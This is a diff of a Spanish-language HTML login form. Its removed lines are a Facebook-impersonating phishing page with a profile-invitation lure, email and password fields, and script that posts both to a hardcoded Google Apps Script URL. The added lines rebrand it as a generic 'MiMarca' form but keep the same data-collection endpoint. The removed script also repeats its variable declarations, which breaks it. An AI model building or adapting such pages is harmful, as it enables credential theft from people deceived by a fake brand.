@@ -1,28 +1,21 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
 
   <meta charset="UTF-8">
 
-  <meta
-    name="viewport"
-    content="width=device-width, initial-scale=1.0"
-  >
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- =====================================================
-       ✏️ EDITAR AQUÍ: TÍTULO DE LA PESTAÑA
-       ===================================================== -->
-
+  <!-- ✏️ EDITAR AQUÍ: TÍTULO DE LA PESTAÑA -->
   <title>Mi formulario</title>
 
 
   <style>
 
-    /* =========================================================
+    /* =====================================================
        🎨🎨🎨 PERSONALIZACIÓN
-       
-       MODIFICA AQUÍ COLORES, FONDO, TAMAÑOS, ETC.
-       ========================================================= */
+       ===================================================== */
 
     :root {
 
@@ -41,30 +34,28 @@
       /* ✏️ COLOR DEL TEXTO SECUNDARIO */
       --color-texto-secundario: #65676b;
 
-      /* ✏️ COLOR DEL INTERIOR DE LOS CAMPOS */
+      /* ✏️ COLOR INTERIOR DE LOS CAMPOS */
       --color-input: #f5f6f7;
 
-      /* ✏️ COLOR DEL BORDE DE LOS CAMPOS */
+      /* ✏️ COLOR DEL BORDE */
       --color-borde: #dddfe2;
-
-      /* ✏️ COLOR DEL FONDO */
-      --color-fondo: #f0f2f5;
 
 
       /* =====================================================
          🖼️ IMAGEN DE FONDO
-         
-         Para poner una imagen cambia "none" por:
 
+         Para poner una imagen:
          url("fondo.jpg")
 
+         Para quitarla:
+         none
          ===================================================== */
 
       --imagen-fondo: none;
 
 
       /* =====================================================
-         🌈 FONDO DEGRADADO
+         🌈 DEGRADADO
          ===================================================== */
 
       --fondo-degradado:
@@ -76,13 +67,10 @@
         );
 
 
-      /* ✏️ REDONDEADO DEL FORMULARIO */
+      /* ✏️ REDONDEADOS */
+
       --radio-formulario: 14px;
-
-      /* ✏️ REDONDEADO DE LOS CAMPOS */
       --radio-input: 8px;
-
-      /* ✏️ REDONDEADO DEL BOTÓN */
       --radio-boton: 8px;
 
 
@@ -107,20 +95,18 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        RESET
-       ========================================================= */
+       ===================================================== */
 
     * {
       box-sizing: border-box;
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        CUERPO
-       ========================================================= */
+       ===================================================== */
 
     body {
 
@@ -138,11 +124,6 @@
 
       font-family: var(--fuente);
 
-
-      /* =====================================================
-         ✏️ FONDO
-         ===================================================== */
-
       background:
         var(--imagen-fondo),
         var(--fondo-degradado);
@@ -156,10 +137,9 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        FORMULARIO
-       ========================================================= */
+       ===================================================== */
 
     .formulario {
 
@@ -181,16 +161,15 @@
     }
 
 
-
-    /* =========================================================
-       🏷️ LOGO / NOMBRE
-       
-       ✏️ EDITA "MiMarca" EN EL HTML DE ABAJO
-       ========================================================= */
+    /* =====================================================
+       🏷️ LOGO
+       ===================================================== */
 
     .logo {
 
       text-align: center;
+
+      /* ✏️ TAMAÑO DEL LOGO */
 
       font-size: 38px;
 
@@ -204,10 +183,9 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        🖼️ MINIATURAS
-       ========================================================= */
+       ===================================================== */
 
     .miniaturas {
 
@@ -226,11 +204,9 @@
     }
 
 
-    /* =========================================================
-       ✏️ EDITAR: TAMAÑO DE LAS MINIATURAS
-       ========================================================= */
-
     .miniaturas img {
+
+      /* ✏️ TAMAÑO DE LAS IMÁGENES */
 
       width: 65px;
 
@@ -238,14 +214,16 @@
 
       object-fit: cover;
 
+      /* ✏️ REDONDEADO */
+
       border-radius: 12px;
+
+      /* ✏️ BORDE */
 
       border: 2px solid #eeeeee;
 
       box-shadow:
         0 2px 8px rgba(0, 0, 0, 0.12);
-
-      cursor: pointer;
 
       transition:
         transform 0.2s,
@@ -253,10 +231,6 @@
 
     }
 
-
-    /* =====================================================
-       ✏️ EFECTO DE LAS MINIATURAS
-       ===================================================== */
 
     .miniaturas img:hover {
 
@@ -270,19 +244,20 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        TÍTULO
-       ========================================================= */
+       ===================================================== */
 
     h1 {
 
       text-align: center;
 
       /* ✏️ TAMAÑO */
+
       font-size: 24px;
 
       /* ✏️ COLOR */
+
       color:
         var(--color-texto);
 
@@ -292,10 +267,9 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        DESCRIPCIÓN
-       ========================================================= */
+       ===================================================== */
 
     .descripcion {
 
@@ -314,13 +288,12 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        📝 CAMPOS
        
-       NO HAY LABELS.
-       SOLO SE MOSTRARÁ EL PLACEHOLDER.
-       ========================================================= */
+       NO HAY TEXTOS ENCIMA.
+       SOLO SE VE EL PLACEHOLDER.
+       ===================================================== */
 
     input {
 
@@ -355,30 +328,26 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        ✏️ PLACEHOLDER
-       ========================================================= */
+       ===================================================== */
 
     input::placeholder {
 
-      color:
-        #8a8d91;
+      color: #8a8d91;
 
       opacity: 1;
 
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        INPUT SELECCIONADO
-       ========================================================= */
+       ===================================================== */
 
     input:focus {
 
-      background:
-        #ffffff;
+      background: #ffffff;
 
       border-color:
         var(--color-principal);
@@ -390,10 +359,9 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        🔵 BOTÓN
-       ========================================================= */
+       ===================================================== */
 
     button {
 
@@ -409,8 +377,7 @@
       background:
         var(--color-boton);
 
-      color:
-        #ffffff;
+      color: #ffffff;
 
       font-size: 16px;
 
@@ -425,18 +392,12 @@
     }
 
 
-
-    /* =========================================================
-       ✏️ BOTÓN AL PASAR EL RATÓN
-       ========================================================= */
-
     button:hover {
 
       background:
         var(--color-boton-hover);
 
     }
-
 
 
     button:active {
@@ -447,22 +408,18 @@
     }
 
 
-
     button:disabled {
 
       opacity: 0.6;
 
       cursor: not-allowed;
 
-      transform: none;
-
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        MENSAJE
-       ========================================================= */
+       ===================================================== */
 
     #mensaje {
 
@@ -478,10 +435,9 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        PIE
-       ========================================================= */
+       ===================================================== */
 
     .pie {
 
@@ -497,48 +453,31 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        📱 MÓVIL
-       ========================================================= */
+       ===================================================== */
 
     @media (max-width: 480px) {
 
       body {
-
         padding: 15px;
-
       }
-
 
       .formulario {
-
-        padding:
-          24px 20px;
-
+        padding: 24px 20px;
       }
-
 
       .logo {
-
         font-size: 34px;
-
       }
-
 
       h1 {
-
         font-size: 22px;
-
       }
 
-
       .miniaturas img {
-
         width: 58px;
-
         height: 58px;
-
       }
 
     }
@@ -548,13 +487,12 @@
 </head>
 
 
-
 <body>
 
 
-  <!-- =======================================================
+  <!-- =====================================================
        📦 FORMULARIO
-       ======================================================= -->
+       ===================================================== -->
 
   <form
     class="formulario"
@@ -567,36 +505,39 @@
          ===================================================== -->
 
     <div class="logo">
-
-      Facebook
-
+      MiMarca
     </div>
 
 
-
     <!-- =====================================================
-         🖼️ MINIATURAS
+         🖼️ EDITAR AQUÍ: IMÁGENES
          
-         ✏️ CAMBIA LAS RUTAS DE LAS IMÁGENES
-         
-         Ejemplo:
-         imagen1.jpg
-         
-         O:
-         imagenes/foto1.jpg
+         Cambia imagen1.jpg, etc. por tus archivos.
          ===================================================== -->
 
     <div class="miniaturas">
 
-
-      <!-- ✏️ IMAGEN 1 -->
-
       <img
-        src="https://i.imgur.com/rOJmF5v.jpeg"
+        src="imagen1.jpg"
         alt="Imagen 1"
       >
 
+      <img
+        src="imagen2.jpg"
+        alt="Imagen 2"
+      >
 
+      <img
+        src="imagen3.jpg"
+        alt="Imagen 3"
+      >
+
+      <img
+        src="imagen4.jpg"
+        alt="Imagen 4"
+      >
+
+    </div>
 
 
     <!-- =====================================================
@@ -604,11 +545,8 @@
          ===================================================== -->
 
     <h1>
-
-    
-
+      Bienvenido
     </h1>
-
 
 
     <!-- =====================================================
@@ -616,43 +554,34 @@
          ===================================================== -->
 
     <p class="descripcion">
-
-  Este usuario de Facebook te invita a ver su perfil.¿lo conoces?
-
+      Introduce tus datos para continuar
     </p>
 
 
-
     <!-- =====================================================
-         📝 CAMPO 1
-         
-         ✏️ SOLO CAMBIA EL PLACEHOLDER
+         ✏️ EDITAR AQUÍ: PLACEHOLDER
          ===================================================== -->
 
     <input
       type="email"
       id="email"
       name="email"
-      placeholder="Email"
+      placeholder="Tu correo electrónico"
       required
     >
-
 
 
     <!-- =====================================================
-         📝 CAMPO 2
-         
-         ✏️ SOLO CAMBIA EL PLACEHOLDER
+         ✏️ EDITAR AQUÍ: SEGUNDO PLACEHOLDER
          ===================================================== -->
 
     <input
-      type="password"
+      type="text"
       id="dato"
       name="dato"
-      placeholder="Contraseña"
+      placeholder="Escribe aquí"
       required
     >
-
 
 
     <!-- =====================================================
@@ -663,215 +592,149 @@
       type="submit"
       id="boton"
     >
-
-      Enviar
-
+      Continuar
     </button>
 
 
-
-    <!-- =====================================================
-         MENSAJE
-         ===================================================== -->
+    <!-- MENSAJE -->
 
     <div id="mensaje"></div>
 
 
-
     <!-- =====================================================
-         ✏️ EDITAR AQUÍ: TEXTO DEL PIE
+         ✏️ EDITAR AQUÍ: PIE
          ===================================================== -->
 
     <div class="pie">
-
-      © www.Facebook.com
-
+      © 2026 MiMarca · Todos los derechos reservados
     </div>
 
 
   </form>
 
 
-
-  <!-- =======================================================
-       JAVASCRIPT
-       ======================================================= -->
-
   <script>
 
-// ============================================================
-// ✏️ EDITAR AQUÍ: URL DE TU GOOGLE APPS SCRIPT
-// ============================================================
+    /* =====================================================
+       🔗 GOOGLE APPS SCRIPT
+       
+       TU URL YA ESTÁ INTEGRADA
+       ===================================================== */
 
-const URL_APPS_SCRIPT =
-  "https://script.google.com/macros/s/AKfycbz850nfulumwavVcbRa8HDvL7Hxzw7L5hYPMxfIrZbuuwqiO7etH3hh1b-mriRSutII/exec";
-
-
-const formulario =
-  document.getElementById("formulario");
-
-const boton =
-  document.getElementById("boton");
-
-const mensaje =
-  document.getElementById("mensaje");
+    const URL_APPS_SCRIPT =
+      "https://script.google.com/macros/s/AKfycbz850nfulumwavVcbRa8HDvL7Hxzw7L5hYPMxfIrZbuuwqiO7etH3hh1b-mriRSutII/exec";
 
 
-formulario.addEventListener(
-  "submit",
-  async function(event) {
-
-    event.preventDefault();
-
-
-    boton.disabled = true;
-
-    boton.textContent =
-      "Enviando...";
-
-    mensaje.textContent =
-      "";
-
-
-    // ========================================================
-    // DATOS QUE SE ENVÍAN
-    // ========================================================
-
-    const datos = {
-
-      email:
-        document.getElementById("email").value.trim(),
-
-      dato:
-        document.getElementById("dato").value.trim()
-
-    };
-
-
-    try {
-
-      const respuestaServidor =
-        await fetch(
-          URL_APPS_SCRIPT,
-          {
-            method: "POST",
-
-            body:
-              JSON.stringify(datos)
-          }
-        );
-
-
-      const resultado =
-        await respuestaServidor.json();
-
-
-      if (resultado.ok) {
-
-        mensaje.textContent =
-          "¡Datos enviados correctamente!";
-
-        formulario.reset();
-
-      } else {
-
-        mensaje.textContent =
-          resultado.mensaje ||
-          "Ha ocurrido un error.";
-
-      }
-
-
-    } catch (error) {
-
-      console.error(error);
-
-      mensaje.textContent =
-        "No se pudo enviar el formulario.";
-
-    }
-
-
-    boton.disabled =
-      false;
-
-    boton.textContent =
-      "Continuar";
-
-  }
-);
-
+    const formulario =
+      document.getElementById("formulario");
 
     const boton =
       document.getElementById("boton");
-
 
     const mensaje =
       document.getElementById("mensaje");
 
 
+    /* =====================================================
+       📤 ENVÍO
+       ===================================================== */
 
     formulario.addEventListener(
       "submit",
-      function(event) {
-
+      async function(event) {
 
         event.preventDefault();
 
 
         boton.disabled = true;
 
-
-        /* ✏️ TEXTO MIENTRAS PROCESA */
-
         boton.textContent =
-          "Procesando...";
-
+          "Enviando...";
 
         mensaje.textContent =
           "";
 
 
+        /* =================================================
+           DATOS QUE SE ENVÍAN
+           ================================================= */
 
-        /*
-         * =====================================================
-         * AQUÍ PUEDES CONECTAR TU PROPIO SISTEMA
-         * =====================================================
-         *
-         * Para una aplicación real, utiliza un backend
-         * propio y un mecanismo seguro de autenticación.
-         */
+        const datos = {
+
+          email:
+            document
+              .getElementById("email")
+              .value
+              .trim(),
+
+          dato:
+            document
+              .getElementById("dato")
+              .value
+              .trim()
+
+        };
 
 
+        try {
 
-        setTimeout(function() {
+
+          const respuesta =
+            await fetch(
+              URL_APPS_SCRIPT,
+              {
+                method: "POST",
+
+                body:
+                  JSON.stringify(datos)
+              }
+            );
 
 
-          /* ✏️ MENSAJE DE ÉXITO */
+          const resultado =
+            await respuesta.json();
+
+
+          if (resultado.ok) {
+
+            /* ✏️ EDITAR: MENSAJE DE ÉXITO */
+
+            mensaje.textContent =
+              "¡Enviado correctamente!";
+
+            formulario.reset();
+
+          } else {
+
+            mensaje.textContent =
+              resultado.mensaje ||
+              "Ha ocurrido un error.";
+
+          }
+
+
+        } catch (error) {
+
+          console.error(error);
 
           mensaje.textContent =
-            "¡Solicitud enviada correctamente!";
+            "No se pudo conectar con el servidor.";
+
+        }
 
 
-          boton.disabled =
-            false;
+        boton.disabled =
+          false;
 
-
-          /* ✏️ TEXTO DEL BOTÓN */
-
-          boton.textContent =
-            "Continuar";
-
-
-        }, 800);
-
+        boton.textContent =
+          "Continuar";
 
       }
-
     );
 
   </script>
 
 
 </body>
+
 </html>
